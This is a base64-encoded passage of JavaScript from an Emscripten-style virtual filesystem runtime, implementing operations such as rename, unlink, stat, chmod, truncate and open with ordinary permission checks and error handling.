IGlmKCFQQVRILnJlc29sdmUob2xkcGF0aCkpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKQogICAgICAgIH0KICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChuZXdwYXRoLCB7cGFyZW50OiB0cnVlfSk7CiAgICAgICAgdmFyIHBhcmVudCA9IGxvb2t1cC5ub2RlOwogICAgICAgIGlmKCFwYXJlbnQpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKQogICAgICAgIH0KICAgICAgICB2YXIgbmV3bmFtZSA9IFBBVEguYmFzZW5hbWUobmV3cGF0aCk7CiAgICAgICAgdmFyIGVyciA9IEZTLm1heUNyZWF0ZShwYXJlbnQsIG5ld25hbWUpOwogICAgICAgIGlmKGVycikgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpCiAgICAgICAgfQogICAgICAgIGlmKCFwYXJlbnQubm9kZV9vcHMuc3ltbGluaykgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHBhcmVudC5ub2RlX29wcy5zeW1saW5rKHBhcmVudCwgbmV3bmFtZSwgb2xkcGF0aCkKICAgIH0pLAogICAgcmVuYW1lOiAoZnVuY3Rpb24ob2xkX3BhdGgsIG5ld19wYXRoKSB7CiAgICAgICAgdmFyIG9sZF9kaXJuYW1lID0gUEFUSC5kaXJuYW1lKG9sZF9wYXRoKTsKICAgICAgICB2YXIgbmV3X2Rpcm5hbWUgPSBQQVRILmRpcm5hbWUobmV3X3BhdGgpOwogICAgICAgIHZhciBvbGRfbmFtZSA9IFBBVEguYmFzZW5hbWUob2xkX3BhdGgpOwogICAgICAgIHZhciBuZXdfbmFtZSA9IFBBVEguYmFzZW5hbWUobmV3X3BhdGgpOwogICAgICAgIHZhciBsb29rdXAsIG9sZF9kaXIsIG5ld19kaXI7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgbG9va3VwID0gRlMubG9va3VwUGF0aChvbGRfcGF0aCwge3BhcmVudDogdHJ1ZX0pOwogICAgICAgICAgICBvbGRfZGlyID0gbG9va3VwLm5vZGU7CiAgICAgICAgICAgIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgobmV3X3BhdGgsIHtwYXJlbnQ6IHRydWV9KTsKICAgICAgICAgICAgbmV3X2RpciA9IGxvb2t1cC5ub2RlCiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCVVNZKQogICAgICAgIH0KICAgICAgICBpZighb2xkX2RpciB8fCAhbmV3X2RpcikgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKTsKICAgICAgICBpZihvbGRfZGlyLm1vdW50ICE9PSBuZXdfZGlyLm1vdW50KSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVYREVWKQogICAgICAgIH0KICAgICAgICB2YXIgb2xkX25vZGUgPSBGUy5sb29rdXBOb2RlKG9sZF9kaXIsIG9sZF9uYW1lKTsKICAgICAgICB2YXIgcmVsYXRpdmUgPSBQQVRILnJlbGF0aXZlKG9sZF9wYXRoLCBuZXdfZGlybmFtZSk7CiAgICAgICAgaWYocmVsYXRpdmUuY2hhckF0KDApICE9PSAiLiIpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKQogICAgICAgIH0KICAgICAgICByZWxhdGl2ZSA9IFBBVEgucmVsYXRpdmUobmV3X3BhdGgsIG9sZF9kaXJuYW1lKTsKICAgICAgICBpZihyZWxhdGl2ZS5jaGFyQXQoMCkgIT09ICIuIikgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9URU1QVFkpCiAgICAgICAgfQogICAgICAgIHZhciBuZXdfbm9kZTsKICAgICAgICB0cnkgewogICAgICAgICAgICBuZXdfbm9kZSA9IEZTLmxvb2t1cE5vZGUobmV3X2RpciwgbmV3X25hbWUpCiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgfQogICAgICAgIGlmKG9sZF9ub2RlID09PSBuZXdfbm9kZSkgewogICAgICAgICAgICByZXR1cm4KICAgICAgICB9CiAgICAgICAgdmFyIGlzZGlyID0gRlMuaXNEaXIob2xkX25vZGUubW9kZSk7CiAgICAgICAgdmFyIGVyciA9IEZTLm1heURlbGV0ZShvbGRfZGlyLCBvbGRfbmFtZSwgaXNkaXIpOwogICAgICAgIGlmKGVycikgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpCiAgICAgICAgfQogICAgICAgIGVyciA9IG5ld19ub2RlID8gRlMubWF5RGVsZXRlKG5ld19kaXIsIG5ld19uYW1lLCBpc2RpcikgOiBGUy5tYXlDcmVhdGUobmV3X2RpciwgbmV3X25hbWUpOwogICAgICAgIGlmKGVycikgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpCiAgICAgICAgfQogICAgICAgIGlmKCFvbGRfZGlyLm5vZGVfb3BzLnJlbmFtZSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSkKICAgICAgICB9CiAgICAgICAgaWYoRlMuaXNNb3VudHBvaW50KG9sZF9ub2RlKSB8fCBuZXdfbm9kZSAmJiBGUy5pc01vdW50cG9pbnQobmV3X25vZGUpKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCVVNZKQogICAgICAgIH0KICAgICAgICBpZihuZXdfZGlyICE9PSBvbGRfZGlyKSB7CiAgICAgICAgICAgIGVyciA9IEZTLm5vZGVQZXJtaXNzaW9ucyhvbGRfZGlyLCAidyIpOwogICAgICAgICAgICBpZihlcnIpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycikKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICB0cnkgewogICAgICAgICAgICBpZihGUy50cmFja2luZ0RlbGVnYXRlWyJ3aWxsTW92ZVBhdGgiXSkgewogICAgICAgICAgICAgICAgRlMudHJhY2tpbmdEZWxlZ2F0ZVsid2lsbE1vdmVQYXRoIl0ob2xkX3BhdGgsIG5ld19wYXRoKQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCJGUy50cmFja2luZ0RlbGVnYXRlWyd3aWxsTW92ZVBhdGgnXSgnIiArIG9sZF9wYXRoICsgIicsICciICsgbmV3X3BhdGggKyAiJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiICsgZS5tZXNzYWdlKQogICAgICAgIH0KICAgICAgICBGUy5oYXNoUmVtb3ZlTm9kZShvbGRfbm9kZSk7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgb2xkX2Rpci5ub2RlX29wcy5yZW5hbWUob2xkX25vZGUsIG5ld19kaXIsIG5ld19uYW1lKQogICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICB0aHJvdyBlCiAgICAgICAgfSBmaW5hbGx5IHsKICAgICAgICAgICAgRlMuaGFzaEFkZE5vZGUob2xkX25vZGUpCiAgICAgICAgfQogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmKEZTLnRyYWNraW5nRGVsZWdhdGVbIm9uTW92ZVBhdGgiXSkgRlMudHJhY2tpbmdEZWxlZ2F0ZVsib25Nb3ZlUGF0aCJdKG9sZF9wYXRoLCBuZXdfcGF0aCkKICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgY29uc29sZS5sb2coIkZTLnRyYWNraW5nRGVsZWdhdGVbJ29uTW92ZVBhdGgnXSgnIiArIG9sZF9wYXRoICsgIicsICciICsgbmV3X3BhdGggKyAiJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiICsgZS5tZXNzYWdlKQogICAgICAgIH0KICAgIH0pLAogICAgcm1kaXI6IChmdW5jdGlvbihwYXRoKSB7CiAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCwge3BhcmVudDogdHJ1ZX0pOwogICAgICAgIHZhciBwYXJlbnQgPSBsb29rdXAubm9kZTsKICAgICAgICB2YXIgbmFtZSA9IFBBVEguYmFzZW5hbWUocGF0aCk7CiAgICAgICAgdmFyIG5vZGUgPSBGUy5sb29rdXBOb2RlKHBhcmVudCwgbmFtZSk7CiAgICAgICAgdmFyIGVyciA9IEZTLm1heURlbGV0ZShwYXJlbnQsIG5hbWUsIHRydWUpOwogICAgICAgIGlmKGVycikgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpCiAgICAgICAgfQogICAgICAgIGlmKCFwYXJlbnQubm9kZV9vcHMucm1kaXIpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pCiAgICAgICAgfQogICAgICAgIGlmKEZTLmlzTW91bnRwb2ludChub2RlKSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQlVTWSkKICAgICAgICB9CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYoRlMudHJhY2tpbmdEZWxlZ2F0ZVsid2lsbERlbGV0ZVBhdGgiXSkgewogICAgICAgICAgICAgICAgRlMudHJhY2tpbmdEZWxlZ2F0ZVsid2lsbERlbGV0ZVBhdGgiXShwYXRoKQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCJGUy50cmFja2luZ0RlbGVnYXRlWyd3aWxsRGVsZXRlUGF0aCddKCciICsgcGF0aCArICInKSB0aHJldyBhbiBleGNlcHRpb246ICIgKyBlLm1lc3NhZ2UpCiAgICAgICAgfQogICAgICAgIHBhcmVudC5ub2RlX29wcy5ybWRpcihwYXJlbnQsIG5hbWUpOwogICAgICAgIEZTLmRlc3Ryb3lOb2RlKG5vZGUpOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmKEZTLnRyYWNraW5nRGVsZWdhdGVbIm9uRGVsZXRlUGF0aCJdKSBGUy50cmFja2luZ0RlbGVnYXRlWyJvbkRlbGV0ZVBhdGgiXShwYXRoKQogICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICBjb25zb2xlLmxvZygiRlMudHJhY2tpbmdEZWxlZ2F0ZVsnb25EZWxldGVQYXRoJ10oJyIgKyBwYXRoICsgIicpIHRocmV3IGFuIGV4Y2VwdGlvbjogIiArIGUubWVzc2FnZSkKICAgICAgICB9CiAgICB9KSwKICAgIHJlYWRkaXI6IChmdW5jdGlvbihwYXRoKSB7CiAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCwge2ZvbGxvdzogdHJ1ZX0pOwogICAgICAgIHZhciBub2RlID0gbG9va3VwLm5vZGU7CiAgICAgICAgaWYoIW5vZGUubm9kZV9vcHMucmVhZGRpcikgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9URElSKQogICAgICAgIH0KICAgICAgICByZXR1cm4gbm9kZS5ub2RlX29wcy5yZWFkZGlyKG5vZGUpCiAgICB9KSwKICAgIHVubGluazogKGZ1bmN0aW9uKHBhdGgpIHsKICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChwYXRoLCB7cGFyZW50OiB0cnVlfSk7CiAgICAgICAgdmFyIHBhcmVudCA9IGxvb2t1cC5ub2RlOwogICAgICAgIHZhciBuYW1lID0gUEFUSC5iYXNlbmFtZShwYXRoKTsKICAgICAgICB2YXIgbm9kZSA9IEZTLmxvb2t1cE5vZGUocGFyZW50LCBuYW1lKTsKICAgICAgICB2YXIgZXJyID0gRlMubWF5RGVsZXRlKHBhcmVudCwgbmFtZSwgZmFsc2UpOwogICAgICAgIGlmKGVycikgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpCiAgICAgICAgfQogICAgICAgIGlmKCFwYXJlbnQubm9kZV9vcHMudW5saW5rKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKQogICAgICAgIH0KICAgICAgICBpZihGUy5pc01vdW50cG9pbnQobm9kZSkpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJVU1kpCiAgICAgICAgfQogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmKEZTLnRyYWNraW5nRGVsZWdhdGVbIndpbGxEZWxldGVQYXRoIl0pIHsKICAgICAgICAgICAgICAgIEZTLnRyYWNraW5nRGVsZWdhdGVbIndpbGxEZWxldGVQYXRoIl0ocGF0aCkKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICBjb25zb2xlLmxvZygiRlMudHJhY2tpbmdEZWxlZ2F0ZVsnd2lsbERlbGV0ZVBhdGgnXSgnIiArIHBhdGggKyAiJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiICsgZS5tZXNzYWdlKQogICAgICAgIH0KICAgICAgICBwYXJlbnQubm9kZV9vcHMudW5saW5rKHBhcmVudCwgbmFtZSk7CiAgICAgICAgRlMuZGVzdHJveU5vZGUobm9kZSk7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYoRlMudHJhY2tpbmdEZWxlZ2F0ZVsib25EZWxldGVQYXRoIl0pIEZTLnRyYWNraW5nRGVsZWdhdGVbIm9uRGVsZXRlUGF0aCJdKHBhdGgpCiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCJGUy50cmFja2luZ0RlbGVnYXRlWydvbkRlbGV0ZVBhdGgnXSgnIiArIHBhdGggKyAiJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiICsgZS5tZXNzYWdlKQogICAgICAgIH0KICAgIH0pLAogICAgcmVhZGxpbms6IChmdW5jdGlvbihwYXRoKSB7CiAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCk7CiAgICAgICAgdmFyIGxpbmsgPSBsb29rdXAubm9kZTsKICAgICAgICBpZighbGluaykgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9FTlQpCiAgICAgICAgfQogICAgICAgIGlmKCFsaW5rLm5vZGVfb3BzLnJlYWRsaW5rKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCkKICAgICAgICB9CiAgICAgICAgcmV0dXJuIFBBVEgucmVzb2x2ZShGUy5nZXRQYXRoKGxpbmsucGFyZW50KSwgbGluay5ub2RlX29wcy5yZWFkbGluayhsaW5rKSkKICAgIH0pLAogICAgc3RhdDogKGZ1bmN0aW9uKHBhdGgsIGRvbnRGb2xsb3cpIHsKICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChwYXRoLCB7Zm9sbG93OiAhZG9udEZvbGxvd30pOwogICAgICAgIHZhciBub2RlID0gbG9va3VwLm5vZGU7CiAgICAgICAgaWYoIW5vZGUpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKQogICAgICAgIH0KICAgICAgICBpZighbm9kZS5ub2RlX29wcy5nZXRhdHRyKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKQogICAgICAgIH0KICAgICAgICByZXR1cm4gbm9kZS5ub2RlX29wcy5nZXRhdHRyKG5vZGUpCiAgICB9KSwKICAgIGxzdGF0OiAoZnVuY3Rpb24ocGF0aCkgewogICAgICAgIHJldHVybiBGUy5zdGF0KHBhdGgsIHRydWUpCiAgICB9KSwKICAgIGNobW9kOiAoZnVuY3Rpb24ocGF0aCwgbW9kZSwgZG9udEZvbGxvdykgewogICAgICAgIHZhciBub2RlOwogICAgICAgIGlmKHR5cGVvZiBwYXRoID09PSAic3RyaW5nIikgewogICAgICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChwYXRoLCB7Zm9sbG93OiAhZG9udEZvbGxvd30pOwogICAgICAgICAgICBub2RlID0gbG9va3VwLm5vZGUKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBub2RlID0gcGF0aAogICAgICAgIH0KICAgICAgICBpZighbm9kZS5ub2RlX29wcy5zZXRhdHRyKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKQogICAgICAgIH0KICAgICAgICBub2RlLm5vZGVfb3BzLnNldGF0dHIobm9kZSwge21vZGU6IG1vZGUgJiA0MDk1IHwgbm9kZS5tb2RlICYgfjQwOTUsIHRpbWVzdGFtcDogRGF0ZS5ub3coKX0pCiAgICB9KSwKICAgIGxjaG1vZDogKGZ1bmN0aW9uKHBhdGgsIG1vZGUpIHsKICAgICAgICBGUy5jaG1vZChwYXRoLCBtb2RlLCB0cnVlKQogICAgfSksCiAgICBmY2htb2Q6IChmdW5jdGlvbihmZCwgbW9kZSkgewogICAgICAgIHZhciBzdHJlYW0gPSBGUy5nZXRTdHJlYW0oZmQpOwogICAgICAgIGlmKCFzdHJlYW0pIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpCiAgICAgICAgfQogICAgICAgIEZTLmNobW9kKHN0cmVhbS5ub2RlLCBtb2RlKQogICAgfSksCiAgICBjaG93bjogKGZ1bmN0aW9uKHBhdGgsIHVpZCwgZ2lkLCBkb250Rm9sbG93KSB7CiAgICAgICAgdmFyIG5vZGU7CiAgICAgICAgaWYodHlwZW9mIHBhdGggPT09ICJzdHJpbmciKSB7CiAgICAgICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHtmb2xsb3c6ICFkb250Rm9sbG93fSk7CiAgICAgICAgICAgIG5vZGUgPSBsb29rdXAubm9kZQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIG5vZGUgPSBwYXRoCiAgICAgICAgfQogICAgICAgIGlmKCFub2RlLm5vZGVfb3BzLnNldGF0dHIpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pCiAgICAgICAgfQogICAgICAgIG5vZGUubm9kZV9vcHMuc2V0YXR0cihub2RlLCB7dGltZXN0YW1wOiBEYXRlLm5vdygpfSkKICAgIH0pLAogICAgbGNob3duOiAoZnVuY3Rpb24ocGF0aCwgdWlkLCBnaWQpIHsKICAgICAgICBGUy5jaG93bihwYXRoLCB1aWQsIGdpZCwgdHJ1ZSkKICAgIH0pLAogICAgZmNob3duOiAoZnVuY3Rpb24oZmQsIHVpZCwgZ2lkKSB7CiAgICAgICAgdmFyIHN0cmVhbSA9IEZTLmdldFN0cmVhbShmZCk7CiAgICAgICAgaWYoIXN0cmVhbSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQkFERikKICAgICAgICB9CiAgICAgICAgRlMuY2hvd24oc3RyZWFtLm5vZGUsIHVpZCwgZ2lkKQogICAgfSksCiAgICB0cnVuY2F0ZTogKGZ1bmN0aW9uKHBhdGgsIGxlbikgewogICAgICAgIGlmKGxlbiA8IDApIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKQogICAgICAgIH0KICAgICAgICB2YXIgbm9kZTsKICAgICAgICBpZih0eXBlb2YgcGF0aCA9PT0gInN0cmluZyIpIHsKICAgICAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCwge2ZvbGxvdzogdHJ1ZX0pOwogICAgICAgICAgICBub2RlID0gbG9va3VwLm5vZGUKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBub2RlID0gcGF0aAogICAgICAgIH0KICAgICAgICBpZighbm9kZS5ub2RlX29wcy5zZXRhdHRyKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKQogICAgICAgIH0KICAgICAgICBpZihGUy5pc0Rpcihub2RlLm1vZGUpKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJU0RJUikKICAgICAgICB9CiAgICAgICAgaWYoIUZTLmlzRmlsZShub2RlLm1vZGUpKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCkKICAgICAgICB9CiAgICAgICAgdmFyIGVyciA9IEZTLm5vZGVQZXJtaXNzaW9ucyhub2RlLCAidyIpOwogICAgICAgIGlmKGVycikgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpCiAgICAgICAgfQogICAgICAgIG5vZGUubm9kZV9vcHMuc2V0YXR0cihub2RlLCB7c2l6ZTogbGVuLCB0aW1lc3RhbXA6IERhdGUubm93KCl9KQogICAgfSksCiAgICBmdHJ1bmNhdGU6IChmdW5jdGlvbihmZCwgbGVuKSB7CiAgICAgICAgdmFyIHN0cmVhbSA9IEZTLmdldFN0cmVhbShmZCk7CiAgICAgICAgaWYoIXN0cmVhbSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQkFERikKICAgICAgICB9CiAgICAgICAgaWYoKHN0cmVhbS5mbGFncyAmIDIwOTcxNTUpID09PSAwKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCkKICAgICAgICB9CiAgICAgICAgRlMudHJ1bmNhdGUoc3RyZWFtLm5vZGUsIGxlbikKICAgIH0pLAogICAgdXRpbWU6IChmdW5jdGlvbihwYXRoLCBhdGltZSwgbXRpbWUpIHsKICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChwYXRoLCB7Zm9sbG93OiB0cnVlfSk7CiAgICAgICAgdmFyIG5vZGUgPSBsb29rdXAubm9kZTsKICAgICAgICBub2RlLm5vZGVfb3BzLnNldGF0dHIobm9kZSwge3RpbWVzdGFtcDogTWF0aC5tYXgoYXRpbWUsIG10aW1lKX0pCiAgICB9KSwKICAgIG9wZW46IChmdW5jdGlvbihwYXRoLCBmbGFncywgbW9kZSwgZmRfc3RhcnQsIGZkX2VuZCkgewogICAgICAgIGlmKHBhdGggPT09ICIiKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0VOVCkKICAgICAgICB9CiAgICAgICAgZmxhZ3MgPSB0eXBlb2YgZmxhZ3MgPT09ICJzdHJpbmciID8gRlMubW9kZVN0cmluZ1RvRmxhZ3MoZmxhZ3MpIDogZmxhZ3M7CiAgICAgICAgbW9kZSA9IHR5cGVvZiBtb2RlID09PSAidW5kZWZpbmVkIiA/IDQzOCA6IG1vZGU7CiAgICAgICAgaWYoZmxhZ3MgJiA2NCkgewogICAgICAgICAgICBtb2RlID0gbW9kZSAmIDQwOTUgfCAzMjc2OAogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIG1vZGUgPSAwCiAgICAgICAgfQogICAgICAgIHZhciBub2RlOwogICAgICAgIGlmKHR5cGVvZiBwYXRoID09PSAib2JqZWN0IikgewogICAgICAgICAgICBub2RlID0gcGF0aAogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHBhdGggPSBQQVRILm5vcm1hbGl6ZShwYXRoKTsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHtmb2xsb3c6ICEoZmxhZ3MgJiAxMzEwNzIpfSk7CiAgICAgICAgICAgICAgICBub2RlID0gbG9va3VwLm5vZGUKICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgdmFyIGNyZWF0ZWQgPSBmYWxzZTsKICAgICAgICBpZihmbGFncyAmIDY0KSB7CiAgICAgICAgICAgIGlmKG5vZGUpIHsKICAgICAgICAgICAgICAgIGlmKGZsYWdzICYgMTI4KSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUVYSVNUKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgbm9kZSA9IEZTLm1rbm9kKHBhdGgsIG1vZGUsIDApOwogICAgICAgICAgICAgICAgY3JlYXRlZCA9IHRydWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZighbm9kZSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9FTlQpCiAgICAgICAgfQogICAgICAgIGlmKEZTLmlzQ2hyZGV2KG5vZGUubW9kZSkpIHsKICAgICAgICAgICAgZmxhZ3MgJj0gfjUxMgogICAgICAgIH0KICAgICAgICBpZihmbGFncyAmIDY1NTM2ICYmICFGUy5pc0Rpcihub2RlLm1vZGUpKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT1RESVIpCiAgICAgICAgfQogICAgICAgIGlmKCFjcmVhdGVkKSB7CiAgICAgICAgICAgIHZhciBlcnIgPSBGUy5tYXlPcGVuKG5vZGUsIGZsYWdzKTsKICAgICAgICAgICAgaWYoZXJyKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYoZmxhZ3MgJiA1MTIpIHsKICAgICAgICAgICAgRlMudHJ1bmNhdGUobm9kZSwgMCkKICAgICAgICB9CiAgICAgICAgZmxhZ3MgJj0gfigxMjggfCA1MTIpOwogICAgICAgIHZhciBzdHJlYW0gPSBGUy5jcmVhdGVTdHJlYW0oewogICAgICAgICAgICBub2RlOiBub2RlLAogICAgICAgICAgICBwYXRoOiBGUy5nZXRQYXRoKG5vZGUpLAogICAgICAgICAgICBmbGFnczogZmxhZ3MsCiAgICAgICAgICAgIHNlZWthYmxlOiB0cnVlLAogICAgICAgICAgICBwb3NpdGlvbjogMCwKICAgICAgICAgICAgc3RyZWFtX29wczogbm9kZS5zdHJlYW1fb3BzLAogICAgICAgICAgICB1bmdvdHRlbjogW10sCiAgICAgICAgICAgIGVycm9yOiBmYWxzZQogICAgICAgIH0sIGZkX3N0YXJ0LCBmZF9lbmQpOwogICAgICAgIGlmKHN0cmVhbS5zdHJlYW1fb3BzLm9wZW4pIHsKICAgICAgICAgICAgc3RyZWFtLnN0cmVhbV9vcHMub3BlbihzdHJlYW0pCiAgICAgICAgfQogICAgICAgIGlmKE1vZHVsZVsibG9nUmVhZEZpbGVzIl0gJiYgIShmbGFncyAmIDEpKSB7CiAgICAgICAgICAgIGlmKCFGUy5yZWFkRmlsZXMpIEZTLnJlYWRGaWxlcyA9IHt9OwogICAgICAgICAgICBpZighKHBhdGggaW4gRlMucmVhZEZpbGVzKSkgewogICAgICAgICAgICAgICAgRlMucmVhZEZpbGVzW3BhdGhdID0gMTsKICAgICAgICAgICAgICAgIE1vZHVsZVsicHJpbnRFcnIiXSgicmVhZCBmaWxlOiAiICsgcGF0aCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICB0cnkgewogICAgICAgICAgICBpZihGUy50cmFja2luZ0RlbGVnYXRlWyJvbk9wZW5GaWxlIl0pIHsKICAgICAgICAgICAgICAgIHZhciB0cmFja2luZ0ZsYWdzID0gMDsKICAgICAgICAgICAgICAgIGlmKChmbGFncyAmIDIwOTcxNTUpICE9PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgdHJhY2tpbmdGbGFncyB8PSBGUy50cmFja2luZy5vcGVuRmxhZ3MuUkVBRAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYoKGZsYWdzICYgMjA5NzE1NSkgIT09IDApIHsKICAgICAgICAgICAgICAgICAgICB0cmFja2luZ0ZsYWdzIHw9IEZTLnRyYWNraW5nLm9wZW5GbGFncy5XUklURQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgRlMudHJhY2tpbmdEZWxlZ2F0ZVsib25PcGVuRmlsZSJdKHBhdGgsIHRyYWNraW5nRmxhZ3MpCiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgY29uc29sZS5sb2coIkZTLnRyYWNraW5nRGVsZWdhdGVbJ29